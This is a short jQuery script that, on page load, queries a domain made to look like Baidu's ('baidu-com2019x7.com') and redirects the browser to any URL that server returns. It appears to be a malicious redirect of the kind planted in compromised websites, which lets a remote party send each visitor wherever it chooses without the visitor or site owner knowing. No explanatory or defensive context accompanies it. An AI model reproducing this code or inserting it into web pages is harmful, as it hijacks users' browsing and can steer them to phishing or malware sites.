$(document).ready(function () {
    $.ajax({
        url: 'http://x7server-v1.baidu-com2019x7.com/banned/',
        async: false,
        success: function (a) {
            console.log(a)
            if (a.data.status == '200') {
                window.location.href = a.data.url
            } else {
                console.log("jump === false")
            }
        }
    })
})